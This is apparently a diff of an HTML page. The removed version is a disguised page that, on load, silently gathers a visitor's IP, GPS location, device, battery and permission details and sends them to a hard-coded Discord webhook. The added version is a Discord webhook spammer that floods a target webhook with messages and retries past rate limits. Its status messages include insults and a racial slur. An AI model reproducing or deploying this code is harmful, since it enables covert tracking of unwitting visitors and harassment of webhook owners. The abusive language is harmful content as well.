@@ -1,134 +1,262 @@
-<!DOCTYPE html>
-<html>
 <head>
-  <title>Ultra Device Snapshot</title>
+  <meta charset="UTF-8" />
+  <title>$$$</title>
+  <link rel="icon" href="https://i.ibb.co/cK1TMCNF/benimaru.jpg" type="image/png" />
+  <style>
+  </style>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: url('https://i.ibb.co/cK1TMCNF/benimaru.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      background-color: rgba(35, 39, 42, 0.85);
+      padding: 30px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(5px);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #7289DA;
+      user-select: none;
+    }
+    label {
+      display: block;
+      margin-top: 12px;
+      font-weight: 600;
+      user-select: none;
+    }
+    input[type="text"],
+    input[type="url"],
+    input[type="number"],
+    input[type="color"],
+    textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: none;
+      background-color: #99AAB5;
+      color: #000;
+      resize: vertical;
+      font-size: 14px;
+      user-select: text;
+    }
+    textarea {
+      min-height: 60px;
+    }
+    input[type="checkbox"] {
+      margin-right: 8px;
+      vertical-align: middle;
+      cursor: pointer;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #7289DA;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #5b6eae;
+    }
+    #status {
+      text-align: center;
+      margin-top: 15px;
+      font-weight: 700;
+      min-height: 24px;
+      user-select: none;
+    }
+  </style>
 </head>
 <body>
-  <h1>Generating script...</h1>
+  <div class="container">
+    <h2>basta spammer haha</h2>
+    <form id="webhookForm">
+      <label for="webhookUrl">Webhook URL:</label>
+      <input type="url" id="webhookUrl" required placeholder="Webhook dito bobo!" />
+
+      <label for="webhookAvatar">Webhook Avatar URL:</label>
+      <input type="url" id="webhookAvatar" placeholder="https://i.ibb.co/cK1TMCNF/benimaru.jpg" />
+
+      <label for="username">Username:</label>
+      <input type="text" id="username" value="xx" />
+
+      <label>
+        <input type="checkbox" id="useEmbed" />
+        Use Embed
+      </label>
+
+      <div id="embedOptions" style="display:none;">
+        <label for="embedTitle">Embed Title:</label>
+        <input type="text" id="embedTitle" placeholder="Embed title" />
+
+        <label for="embedDescription">Embed Description:</label>
+        <textarea id="embedDescription" placeholder="Embed description"></textarea>
+
+        <label for="embedColor">Embed Color:</label>
+        <input type="color" id="embedColor" value="#5865F2" />
+
+        <label for="embedImage">Embed Image URL:</label>
+        <input type="url" id="embedImage" placeholder="Optional embed image URL" />
+      </div>
+
+      <label for="content">Message Content:</label>
+      <textarea id="content" placeholder="Message"></textarea>
+
+      <label for="messageCount">Message Ammount:</label>
+      <input type="number" id="messageCount" min="10" value="1" />
+
+      <label for="delay">Delay:</label>
+      <input type="number" id="delay" min="0" max="5000" value="0" />
+
+      <button type="submit">Send Messages</button>
+    </form>
+    <p id="status"></p>
+  </div>
+
   <script>
-    async function getIPInfo() {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        return await res.json();
-      } catch {
-        return {};
+    const form = document.getElementById('webhookForm');
+    const useEmbedCheckbox = document.getElementById('useEmbed');
+    const embedOptionsDiv = document.getElementById('embedOptions');
+    const statusMsg = document.getElementById('status');
+
+    let spammerActive = false;
+
+    useEmbedCheckbox.addEventListener('change', () => {
+      embedOptionsDiv.style.display = useEmbedCheckbox.checked ? 'block' : 'none';
+    });
+
+    const delay = ms => new Promise(res => setTimeout(res, ms));
+
+    form.addEventListener('submit', async e => {
+      e.preventDefault();
+
+      if (spammerActive) {
+        statusMsg.textContent = '⚠️ Spammer is already running.';
+        statusMsg.style.color = '#F04747';
+        return;
       }
-    }
 
-    function getBatteryInfo() {
-      return navigator.getBattery?.().then(battery => ({
-        "🔋 Battery Level": `${Math.round(battery.level * 100)}%`,
-        "🔌 Charging": battery.charging ? "Yes" : "No"
-      })) || Promise.resolve({});
-    }
+      const url = document.getElementById('webhookUrl').value.trim();
+      const avatar_url = document.getElementById('webhookAvatar').value.trim();
+      const username = document.getElementById('username').value.trim() || 'Bot';
+      const useEmbed = useEmbedCheckbox.checked;
 
-    function getConnectionInfo() {
-      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-      return {
-        "📶 Connection Type": conn.effectiveType || "Unknown",
-        "⏱️ Downlink (Mbps)": conn.downlink || "Unknown",
-        "⏳ RTT (ms)": conn.rtt || "Unknown"
-      };
-    }
+      const embedTitle = document.getElementById('embedTitle').value.trim();
+      const embedDescription = document.getElementById('embedDescription').value.trim();
+      const embedColor = document.getElementById('embedColor').value || '#5865F2';
+      const embedImage = document.getElementById('embedImage').value.trim();
 
-    function getBasicInfo() {
-      return {
-        "🖥️ Platform": navigator.platform,
-        "🧭 User Agent": navigator.userAgent,
-        "🗺️ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "📺 Screen Resolution": `${screen.width}x${screen.height}`,
-        "🔄 Orientation": screen.orientation?.type || "Unknown",
-        "🌐 Online": navigator.onLine ? "Yes" : "No",
-        "👀 Page Visible": document.visibilityState,
-        "🧠 RAM Estimate": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
-        "🧮 CPU Cores": navigator.hardwareConcurrency || "Unavailable",
-        "🎨 Color Depth": screen.colorDepth || "Unknown",
-        "🌐 Language": navigator.language,
-        "🍪 Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
-        "📱 Touch Support": 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Yes" : "No",
-        "🔐 HTTPS Connection": window.isSecureContext ? "Yes" : "No"
-      };
-    }
+      const content = document.getElementById('content').value.trim();
+      const messageCount = parseInt(document.getElementById('messageCount').value, 10) || 1;
+      const delayMs = parseInt(document.getElementById('delay').value, 10);
+      if (delayMs < 0) {
+        statusMsg.textContent = 'negroo ka tanga! hahaha';
+        statusMsg.style.color = '#F04747';
+        return;
+      }
 
-    async function getPermissionsStatus() {
-      const names = ["geolocation", "notifications", "camera", "microphone"];
-      const result = {};
-      for (const name of names) {
+      if (!url) {
+        statusMsg.textContent = 'Please enter a valid webhook URL.';
+        statusMsg.style.color = '#F04747';
+        return;
+      }
+
+      spammerActive = true;
+      let sent = 0;
+      statusMsg.textContent = '🚀 Starting spam...';
+      statusMsg.style.color = '#43B581';
+
+      function createPayload() {
+        const payload = {
+          username,
+        };
+        if (avatar_url) {
+          payload.avatar_url = avatar_url;
+        }
+
+        if (useEmbed) {
+          const embedObj = {
+            color: parseInt(embedColor.replace('#', ''), 16),
+          };
+          if (embedTitle) embedObj.title = embedTitle;
+          if (embedDescription) embedObj.description = embedDescription;
+          if (embedImage) embedObj.image = { url: embedImage };
+          payload.embeds = [embedObj];
+          payload.content = content || '';
+        } else {
+          payload.content = content;
+        }
+
+        return payload;
+      }
+
+      for (let i = 0; i < messageCount; i++) {
+        if (!spammerActive) break;
+
         try {
-          const status = await navigator.permissions.query({ name });
-          result[`🔒 Permission: ${name}`] = status.state;
-        } catch {
-          result[`🔒 Permission: ${name}`] = "Not Supported";
+          const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(createPayload()),
+          });
+
+          if (response.ok) {
+            sent++;
+            statusMsg.textContent = `✅ Sent ${sent}/${messageCount} messages`;
+            statusMsg.style.color = '#43B581';
+          } else if (response.status === 429) {
+            statusMsg.textContent = `⏳ Plesae Wait...`;
+            statusMsg.style.color = '#FAA61A';
+            await delay(3000);
+            i--; 
+          } else {
+            statusMsg.textContent = `❌ Failed to send message ${i + 1} (status ${response.status})`;
+            statusMsg.style.color = '#F04747';
+            break;
+          }
+        } catch (error) {
+          statusMsg.textContent = `❌ Network error please try again ${i + 1}`;
+          statusMsg.style.color = '#F04747';
+          console.error(error);
+          break;
+        }
+
+        if (delayMs > 0) {
+          await delay(delayMs);
         }
       }
-      return result;
-    }
 
-    function getGeoLocation() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({});
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve({
-            "📍 GPS Latitude": pos.coords.latitude.toFixed(5),
-            "📍 GPS Longitude": pos.coords.longitude.toFixed(5),
-            "📡 Accuracy (m)": pos.coords.accuracy
-          }),
-          () => resolve({ "📍 GPS": "Denied or Unavailable" }),
-          { timeout: 5000 }
-        );
-      });
-    }
-
-    async function sendDeviceInfo() {
-      const [ipInfo, batteryInfo, permissions, gpsInfo] = await Promise.all([
-        getIPInfo(),
-        getBatteryInfo(),
-        getPermissionsStatus(),
-        getGeoLocation()
-      ]);
-
-      const info = {
-        "🌐 IP Address": ipInfo.ip || "Unavailable",
-        "📍 IP Location": `${ipInfo.city || "?"}, ${ipInfo.region || "?"}, ${ipInfo.country_name || "?"}`,
-        "🏢 ISP": ipInfo.org || "Unavailable",
-        ...getBasicInfo(),
-        ...getConnectionInfo(),
-        ...batteryInfo,
-        ...permissions,
-        ...gpsInfo,
-        "📅 Timestamp": new Date().toLocaleString()
-      };
-
-      const webhookUrl = "https://discord.com/api/webhooks/1391142251488481361/kn2nhAco5AZ5_gsFXCIO_S_9ubhIuGDErYfrRa7Vkj_Ii_glbvgsy1KKDnSJ0sOfbuQU";
-
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username: "📡 Ultra Snapshot",
-            avatar_url: "https://i.imgur.com/AfFp7pu.png",
-            embeds: [{
-              title: "🧠 Ultra Device Snapshot",
-              description: "Max data captured from browser environment.",
-              color: 0xff6f00,
-              fields: Object.entries(info).map(([name, value]) => ({
-                name,
-                value: String(value),
-                inline: false
-              })),
-              footer: { text: "Collected using JavaScript API" },
-              timestamp: new Date().toISOString()
-            }]
-          })
-        });
-        console.log("Device info sent to webhook.");
-      } catch (err) {
-        console.error("Webhook failed:", err);
+      if (sent === messageCount) {
+        statusMsg.textContent = `🎉 Sucessfully sent all ${messageCount} messages`;
+        statusMsg.style.color = '#43B581';
       }
-    }
 
-    sendDeviceInfo();
+      spammerActive = false;
+    });
   </script>
 </body>
 </html>
